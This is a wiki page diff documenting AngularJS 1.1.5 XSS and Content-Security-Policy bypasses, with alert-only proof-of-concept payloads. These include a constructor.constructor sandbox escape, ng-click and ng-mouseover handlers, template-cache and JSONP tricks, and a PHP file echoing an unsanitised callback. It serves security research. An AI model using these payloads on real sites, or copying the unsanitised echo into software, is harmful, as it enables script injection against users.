@@ -2,17 +2,15 @@
 
 = Introduction =
 
-Add your content here.
+"AngularJS is an open-source JavaScript framework, maintained by Google, that assists with running single-page applications. Its goal is to augment browser-based applications with model–view–controller (MVC) capability, in an effort to make both development and testing easier.
 
+The library reads in HTML that contains additional custom tag attributes; it then obeys the directives in those custom attributes, and binds input or output parts of the page to a model represented by standard JavaScript variables. The values of those JavaScript variables can be manually set, or retrieved from static or dynamic JSON resources."
 
-= Details =
+From http://en.wikipedia.org/wiki/AngularJS
 
-Add your content here.  Format your content with:
-  * Text in *bold* or _italic_
-  * Headings, paragraphs, and lists
-  * Automatic links to other wiki pages
+= Injection Attacks =
 
-= No CSP =
+AngularJS offers the developer a scope that attempts to isolate global variables from the templating work-flow and keep things lean and Angular-only. This makes sense - and to be fair, the AngularJS documentation explicitly states that the scope object is not considered to be a sandbox. And indeed it is none. With a simple JavaScript trick one can break out of this "non-sandbox" and execute arbitrary code in window and other host objects.
 
 == XSS in Template ==
 
@@ -39,25 +37,13 @@ Add your content here.  Format your content with:
 <b data-ng-app data-ng-style="constructor.constructor('alert(1)')()" />
 }}}
 
-= CSP Bypasses =
+= CSP Bypasses with AngularJS =
 
-== XSS via Click ==
+AngularJS is one of the very few - if not the only - MVC frameworks that has an explicit CSP mode. That means, developers can use the powerful templating engine despite the restrictions on eval and Function CSP imposes.
 
-{{{
-<?php
-header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
-header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
-header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
-header('Set-Cookie: abc=123');
-?><!doctype html>
-<html ng-app ng-csp>
-<head>
-<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
-</head>
-<body ng-click="$event.view.alert(1)" onclick="alert(2)">Click me
-}}}
+That nevertheless bears risks and leads to an interesting phenomenon: In case an attacker can inject HTML into an AngularJS application context, the injected JavaScript will be executed although CSP should protect from this. in other words: AngularJS brings inline-JavaScript on CSP-protected websites back - by using its own attributes and a complex string parsing and event binding mechanism we will discuss later on this page.
 
-== Same via data attribute ==
+== XSS via Click & Hover (ng-click & ng-mouseover attribute) ==
 
 {{{
 <?php
@@ -70,10 +56,29 @@ header('Set-Cookie: abc=123');
 <head>
 <script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
 </head>
-<body data-ng-click="$event.view.alert(1)" onclick="alert(2)">Click me
+<body ng-click="$event.view.alert(1)">
+	Click me
+	<h1 ng-mouseover="$event.target.ownerDocument.defaultView.alert(2)">Hover me</h1>
+</body>
 }}}
 
-== XSS via template cache ==
+== XSS via Click (data-ng-click attribute) ==
+
+{{{
+<?php
+header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
+header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
+header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
+header('Set-Cookie: abc=123');
+?><!doctype html>
+<html ng-app ng-csp>
+<head>
+<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
+</head>
+<body data-ng-click="$event.view.alert(1)" onclick="alert(2)">Click me</body>
+}}}
+
+== XSS via Template Cache ==
 
 {{{
 <?php
@@ -96,6 +101,7 @@ src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></scri
 </html>
 }}}
 
+test.js
 {{{
 var foo = angular.module("foo", []);
 foo.run(['$templateCache', function($templateCache) {
@@ -103,7 +109,7 @@ foo.run(['$templateCache', function($templateCache) {
 }]);
 }}}
 
-== XSS with overlay ==
+== XSS on Hover with CSS-based Overlay ==
 
 {{{
 var foo = angular.module("foo", []);
@@ -135,6 +141,7 @@ header('Set-Cookie: abc=123');
 </html>
 }}}
 
+test.js
 {{{
 function FetchCtrl($scope, $http, $templateCache) {
     $scope.method = 'JSONP';
@@ -157,17 +164,14 @@ function foo(){
 }
 }}}
 
+test.json
 {{{
 <?php echo $_GET['callback']; ?>({"name":"Super Hero","salutation":"Namaskar","greeting":"Namaskar Super Hero!"});
 }}}
 
-== Flaws == 
-
- * Injected payload bound to an event that executes in the permitted scope
- * JSONP actually attaches an element to the DOM - that contains the injected payload - thus bypasses CSP
-
-
 == Eval via Function (no CSP) ==
+
+Below we can see the code that causes the XSS (in non-CSP modes). Again the framework makes extensive use of implicit `eval` using the `Function` constructor:
 
 {{{
     function getterFn(path, csp) {
@@ -224,7 +228,9 @@ function foo(){
     }
 }}}
 
-== "Eval" via Event Binding (CSP) ==
+== "Eval" via Event Binding (using CSP) ==
+
+More interesting is the way how AngularJS enables inline JavaScript despite restrictive CSP headers being in place. On initialization of the page, AngularJS walks over all event-handling attributes and binds the matching event. Then, upon execution of the event, the content of the attribute is being parsed,tested for validity and ultimately executed. Using events, the parser and direct object access, AngularJS manages to perform a "string-to-code" without using any `eval` or `Function`. Templating despite CSP works - but injection work as well.
 
 {{{
 var ngEventDirectives = {};
